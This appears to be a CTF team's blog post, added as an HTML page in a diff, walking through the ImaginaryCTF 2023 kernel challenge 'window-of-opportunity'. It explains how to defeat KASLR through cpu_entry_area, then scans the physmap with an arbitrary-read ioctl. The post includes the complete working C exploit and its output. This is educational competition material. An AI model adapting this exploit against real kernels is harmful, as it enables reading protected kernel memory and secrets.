@@ -1,0 +1,302 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[ImaginaryCTF 2023 - pwn] window-of-opportunity // ret2school</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[ImaginaryCTF 2023 - pwn] window-of-opportunity"/>
+<meta name="twitter:description" content="window-of-opportunity  window-of-opportunity (490 pts) - 11 solves by Eth007
+Description: Sometimes, there is a glimmer of hope, a spark of inspiration, a window of opportunity.
+Attachments https://imaginaryctf.org/r/izYM0#opportunity_dist.zip
+nc window-of-opportunity.chal.imaginaryctf.org 1337
+ window-of-opportunity is a kernel exploitation challenge I did for the ImaginaryCTF 2023. We are given an arbitrary read primitive (and a stack buffer overflow but I didn&rsquo;t use it), and the goal is basically to read the /flag.txt file."/>
+
+    <meta property="og:title" content="[ImaginaryCTF 2023 - pwn] window-of-opportunity" />
+<meta property="og:description" content="window-of-opportunity  window-of-opportunity (490 pts) - 11 solves by Eth007
+Description: Sometimes, there is a glimmer of hope, a spark of inspiration, a window of opportunity.
+Attachments https://imaginaryctf.org/r/izYM0#opportunity_dist.zip
+nc window-of-opportunity.chal.imaginaryctf.org 1337
+ window-of-opportunity is a kernel exploitation challenge I did for the ImaginaryCTF 2023. We are given an arbitrary read primitive (and a stack buffer overflow but I didn&rsquo;t use it), and the goal is basically to read the /flag.txt file." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/iwindow/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2023-07-24T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-07-24T00:00:00+00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <span class="app-header-title">ret2school</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/post/list_team/">About</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[ImaginaryCTF 2023 - pwn] window-of-opportunity</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jul 24, 2023
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          6 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/corctf/">corCTF</a>
+              <a class="tag" href="https://ret2school.github.io/tags/2022/">2022</a>
+              <a class="tag" href="https://ret2school.github.io/tags/kernel/">kernel</a>
+              <a class="tag" href="https://ret2school.github.io/tags/nasm/">nasm</a>
+              <a class="tag" href="https://ret2school.github.io/tags/pwn/">pwn</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="window-of-opportunity">window-of-opportunity</h1>
+<blockquote>
+<p>window-of-opportunity (490 pts) - 11 solves
+by Eth007</p>
+<p>Description: Sometimes, there is a glimmer of hope, a spark of inspiration, a window of opportunity.</p>
+<p>Attachments
+<a href="https://imaginaryctf.org/r/izYM0#opportunity_dist.zip">https://imaginaryctf.org/r/izYM0#opportunity_dist.zip</a></p>
+<p>nc window-of-opportunity.chal.imaginaryctf.org 1337</p>
+</blockquote>
+<p><code>window-of-opportunity</code> is a kernel exploitation challenge I did for the <a href="https://2023.imaginaryctf.org">ImaginaryCTF 2023</a>. We are given an arbitrary read primitive (and a stack buffer overflow but I didn&rsquo;t use it), and the goal is basically to read the <code>/flag.txt</code> file. All the related files can be found <a href="https://github.com/ret2school/ctf/tree/master/2023/imaginaryctf/pwn/window">there</a>.</p>
+<p><img src="https://media.tenor.com/16jBhCDB9x8AAAAC/kyudo-japanese.gif" alt=">&hellip;<"></p>
+<p><strong>TLDR</strong>:</p>
+<ul>
+<li>Leaking with the help of the arbitrary read primitive the kernel base address by reading a pointer toward the .text stored within the fix-mapped <code>cpu_entry_area</code> mapping.</li>
+<li>Using the read primitive to read the whole physmap to get the flag (given the initramfs is mapped directly in the physmap).</li>
+<li>PROFIT</li>
+</ul>
+<h2 id="code-review">Code review</h2>
+<p>We are given a classic <code>initramfs</code> setup for this kernel challenge, which means we already know the whole <code>initramfs</code> will be mapped directly within the physmap mapping off the kernel. If you are not familiar yet with the physmap I advice you to read <a href="https://blog.wohin.me/posts/linux-kernel-pwn-05/">this article</a>. Basically physmap is just a direct mapping of the whole physical memory and it is mapped at a known location from the kernel base address. And given the filesystem &ndash; in our case the <code>initramfs</code> &ndash; is directly mapped into the physical memory we can access it from the physmap.</p>
+<p>Let&rsquo;s take at the <code>ioctl</code> provided by the kernel driver we have to pwn:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6272a4">/* !! This is not the actual decompiled code, I rewrote it to make it easier to read */</span>
+
+<span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">device_ioctl</span>(file <span style="color:#ff79c6">*</span>filp, <span style="color:#ff79c6">__int64</span> cmd, <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> arg)
+{
+  <span style="color:#ff79c6">__int64</span> v3; <span style="color:#6272a4">// rbp
+</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> v4; <span style="color:#6272a4">// rdx
+</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> v5; <span style="color:#6272a4">// rbx
+</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> result; <span style="color:#6272a4">// rax
+</span><span style="color:#6272a4"></span>  request req; <span style="color:#6272a4">// [rsp+0h] [rbp-120h] BYREF
+</span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#ff79c6">__int64</span> v8; <span style="color:#6272a4">// [rsp+108h] [rbp-18h]
+</span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">__int64</span> v9; <span style="color:#6272a4">// [rsp+118h] [rbp-8h]
+</span><span style="color:#6272a4"></span>
+  _fentry__(filp, cmd, arg);
+  v9 <span style="color:#ff79c6">=</span> v3;
+  v8 <span style="color:#ff79c6">=</span> __readgsqword(<span style="color:#bd93f9">0x28u</span>);
+  <span style="color:#ff79c6">if</span> ( (_DWORD)cmd <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x1337</span> )
+  {
+    copy_from_user(<span style="color:#ff79c6">&amp;</span>req, arg, <span style="color:#bd93f9">0x108LL</span>);
+    result <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">int</span>)copy_to_user(arg.buf, req.ptr, <span style="color:#bd93f9">0x100LL</span>);
+  }
+  <span style="color:#ff79c6">else</span>
+  {
+    result <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1LL</span>;
+  }
+  <span style="color:#ff79c6">if</span> ( v8 <span style="color:#ff79c6">!=</span> __readgsqword(<span style="color:#bd93f9">0x28u</span>) )
+    JUMPOUT(<span style="color:#bd93f9">0xC3LL</span>);
+  <span style="color:#ff79c6">return</span> result;
+}
+</code></pre></div><p>The structure used to exchange with the kernel driver looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> request_s {
+    <span style="color:#8be9fd">uint64_t</span> kptr;
+    <span style="color:#8be9fd">uint8_t</span> buf[<span style="color:#bd93f9">256</span>];
+} request_t;
+</code></pre></div><p>Which means we have a very powerful arbitrary read primitive.</p>
+<h1 id="exploitation">Exploitation</h1>
+<p>To compile the exploit and pack the fs I used this quick and dirty command  if you mind:</p>
+<pre tabindex="0"><code>musl-gcc src/exploit.c -static -o initramfs/exploit &amp;&amp; cd initramfs &amp;&amp; find . -print0 | cpio --null -ov --format=newc &gt; ../initramfs.cpio &amp;&amp; cd .. &amp;&amp; ./run.sh initramfs.cpio
+</code></pre><p>First let&rsquo;s take a look at the protection layout by using the <code>kchecksec</code> developped by <a href="https://github.com/bata24">@bata24</a> in his awesome <a href="https://github.com/bata24/gef">fork of gef</a>.</p>
+<pre tabindex="0"><code>gef&gt; kchecksec
+------------------------------------------------------------------ Kernel information ------------------------------------------------------------------
+Kernel version                          : 5.19.0
+Kernel cmdline                          : console=ttyS0 oops=panic panic=1 kpti=1 kaslr quiet
+Kernel base (heuristic)                 : 0xffffffff9b600000
+Kernel base (_stext from kallsyms)      : 0xffffffff9b600000
+------------------------------------------------------------------- Register settings -------------------------------------------------------------------
+Write Protection (CR0 bit 16)           : Enabled
+PAE (CR4 bit 5)                         : Enabled (NX is supported)
+SMEP (CR4 bit 20)                       : Enabled
+SMAP (CR4 bit 21)                       : Enabled
+CET (CR4 bit 23)                        : Disabled
+-------------------------------------------------------------------- Memory settings --------------------------------------------------------------------
+CONFIG_RANDOMIZE_BASE (KASLR)           : Enabled
+CONFIG_FG_KASLR (FGKASLR)               : Unsupported
+CONFIG_PAGE_TABLE_ISOLATION (KPTI)      : Enabled
+RWX kernel page                         : Not found
+----------------------------------------------------------------------- Allocator -----------------------------------------------------------------------
+Allocator                               : SLUB
+CONFIG_SLAB_FREELIST_HARDENED           : Enabled (offsetof(kmem_cache, random): 0xb8)
+-------------------------------------------------------------------- Security Module --------------------------------------------------------------------
+SELinux                                 : Disabled (selinux_init: Found, selinux_state: Not initialized)
+SMACK                                   : Disabled (smack_init: Found, smackfs: Not mounted)
+AppArmor                                : Enabled (apparmor_init: Found, apparmor_initialized: 1, apparmor_enabled: 1)
+TOMOYO                                  : Disabled (tomoyo_init: Found, tomoyo_enabled: 0)
+Yama (ptrace_scope)                     : Enabled (yama_init: Found, kernel.yama.ptrace_scope: 1)
+Integrity                               : Supported (integrity_iintcache_init: Found)
+LoadPin                                 : Unsupported (loadpin_init: Not found)
+SafeSetID                               : Supported (safesetid_security_init: Found)
+Lockdown                                : Supported (lockdown_lsm_init: Found)
+BPF                                     : Supported (bpf_lsm_init: Found)
+Landlock                                : Supported (landlock_init: Found)
+Linux Kernel Runtime Guard (LKRG)       : Disabled (Not loaded)
+----------------------------------------------------------------- Dangerous system call -----------------------------------------------------------------
+vm.unprivileged_userfaultfd             : Disabled (vm.unprivileged_userfaultfd: 0)
+kernel.unprivileged_bpf_disabled        : Enabled (kernel.unprivileged_bpf_disabled: 2)
+kernel.kexec_load_disabled              : Disabled (kernel.kexec_load_disabled: 0)
+------------------------------------------------------------------------- Other -------------------------------------------------------------------------
+CONFIG_KALLSYMS_ALL                     : Enabled
+CONFIG_RANDSTRUCT                       : Disabled
+CONFIG_STATIC_USERMODEHELPER            : Disabled (modprobe_path: RW-)
+CONFIG_STACKPROTECTOR                   : Enabled (offsetof(task_struct, stack_canary): 0x9c8)
+KADR (kallsyms)                         : Enabled (kernel.kptr_restrict: 2, kernel.perf_event_paranoid: 2)
+KADR (dmesg)                            : Enabled (kernel.dmesg_restrict: 1)
+vm.mmap_min_addr                        : 0x10000
+</code></pre><p>What matters for us is mainly the KASLR that is on. Then, the first step will be to defeat it.</p>
+<h2 id="defeat-kaslr">Defeat kASLR</h2>
+<p>To defeat kASLR we could use the trick already use a while ago by the hxp team in one of their <a href="https://hxp.io/blog/99/hxp-CTF-2022-one_byte-writeup/">kernel shellcoding challenge</a>. The idea would be to read through the <code>cpu_entry_area</code> fix-mapped area, that is not rebased by the kASLR, a pointer toward the kernel .text. Then giving us a powerful infoleak thats allows us to find for example the address of the physmap. I just had to search a few minutes the right pointer in gdb and that&rsquo;s it, at <code>0xfffffe0000002f50</code> is stored a pointer toward <code>KERNEL_BASE + 0x1000b59</code>! Which gives:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    req.kptr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xfffffe0000002f50</span>; 
+    <span style="color:#ff79c6">if</span> (ioctl(fd, <span style="color:#bd93f9">0x1337</span>, <span style="color:#ff79c6">&amp;</span>req)) {
+        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+    }
+
+    kernel_text <span style="color:#ff79c6">=</span>  ((<span style="color:#8be9fd">uint64_t</span><span style="color:#ff79c6">*</span> )req.buf)[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x1000b59</span>;
+    printf(<span style="color:#f1fa8c">&#34;[!] kernel .text found at %lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, kernel_text);
+</code></pre></div><h2 id="physmap-for-the-win">physmap for the win</h2>
+<p>Now we know where the kernel .text is we can deduce by it the addres of the physmap and then we can simply look for the <code>icft</code> pattern while reading the whole physmap. Which gives:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    printf(<span style="color:#f1fa8c">&#34;[!] physmap at %lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, kernel_text <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2c3b000</span>);
+
+    <span style="color:#ff79c6">while</span> (<span style="color:#bd93f9">1</span>) {
+        req.kptr <span style="color:#ff79c6">=</span> kernel_text <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2c00000</span> <span style="color:#ff79c6">+</span> offt;
+        <span style="color:#ff79c6">if</span> (ioctl(fd, <span style="color:#bd93f9">0x1337</span>, <span style="color:#ff79c6">&amp;</span>req)) {
+            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+        }
+
+        <span style="color:#ff79c6">for</span> (size_t i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x100</span>; i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">4</span>) {
+            <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>memcmp(req.buf<span style="color:#ff79c6">+</span>i, <span style="color:#f1fa8c">&#34;ictf&#34;</span>, <span style="color:#bd93f9">4</span>)) {
+                printf(<span style="color:#f1fa8c">&#34;flag: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, (<span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span> )(req.buf<span style="color:#ff79c6">+</span>i));
+            }
+        }
+
+        offt <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">0x100</span>;
+    }
+</code></pre></div><h2 id="profit">PROFIT</h2>
+<p>Finally here we are:</p>
+<pre tabindex="0"><code>mount: mounting host0 on /tmp/mount failed: No such device
+cp: can't stat '/dev/sda': No such file or directory
+
+Boot time: 2.78
+
+---------------------------------------------------------------
+                     _                            
+                    | |                           
+       __      _____| | ___ ___  _ __ ___   ___   
+       \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \  
+        \ V  V /  __/ | (_| (_) | | | | | |  __/_ 
+         \_/\_/ \___|_|\___\___/|_| |_| |_|\___(_)
+                                            
+  Take the opportunity. Look through the window. Get the flag.
+---------------------------------------------------------------
+/ # ./exploit 
+[!] kernel .text found at ffffffff8de00000
+[!] physmap at ffffffff90a3b000
+flag: ictf{th3_real_flag_was_the_f4ke_st4ck_canaries_we_met_al0ng_the_way}
+</code></pre><h1 id="annexes">Annexes</h1>
+<p>Final exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;inttypes.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/types.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/stat.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;fcntl.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/ioctl.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
+</span><span style="color:#ff79c6"></span>
+<span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> request_s {
+    <span style="color:#8be9fd">uint64_t</span> kptr;
+    <span style="color:#8be9fd">uint8_t</span> buf[<span style="color:#bd93f9">256</span>];
+} request_t;
+
+<span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>()
+{
+    request_t req <span style="color:#ff79c6">=</span> {<span style="color:#bd93f9">0</span>};
+    <span style="color:#8be9fd">uint64_t</span> kernel_text <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+    <span style="color:#8be9fd">uint64_t</span> offt <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+
+    <span style="color:#8be9fd">int</span> fd <span style="color:#ff79c6">=</span> open(<span style="color:#f1fa8c">&#34;/dev/window&#34;</span>, O_RDWR);
+    <span style="color:#ff79c6">if</span> (fd <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0</span>) {
+        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+    }
+
+    req.kptr <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xfffffe0000002f50</span>; 
+    <span style="color:#ff79c6">if</span> (ioctl(fd, <span style="color:#bd93f9">0x1337</span>, <span style="color:#ff79c6">&amp;</span>req)) {
+        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+    }
+
+    kernel_text <span style="color:#ff79c6">=</span>  ((<span style="color:#8be9fd">uint64_t</span><span style="color:#ff79c6">*</span> )req.buf)[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x1000b59</span>;
+    printf(<span style="color:#f1fa8c">&#34;[!] kernel .text found at %lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, kernel_text);
+    printf(<span style="color:#f1fa8c">&#34;[!] physmap at %lx</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, kernel_text <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2c3b000</span>);
+
+    <span style="color:#ff79c6">while</span> (<span style="color:#bd93f9">1</span>) {
+        req.kptr <span style="color:#ff79c6">=</span> kernel_text <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0x2c00000</span> <span style="color:#ff79c6">+</span> offt;
+        <span style="color:#ff79c6">if</span> (ioctl(fd, <span style="color:#bd93f9">0x1337</span>, <span style="color:#ff79c6">&amp;</span>req)) {
+            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>;
+        }
+
+        <span style="color:#ff79c6">for</span> (size_t i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x100</span>; i <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">4</span>) {
+            <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>memcmp(req.buf<span style="color:#ff79c6">+</span>i, <span style="color:#f1fa8c">&#34;ictf&#34;</span>, <span style="color:#bd93f9">4</span>)) {
+                printf(<span style="color:#f1fa8c">&#34;flag: %s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, (<span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span> )(req.buf<span style="color:#ff79c6">+</span>i));
+            }
+        }
+
+        offt <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">0x100</span>;
+    }
+
+    close(fd);
+    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+}
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
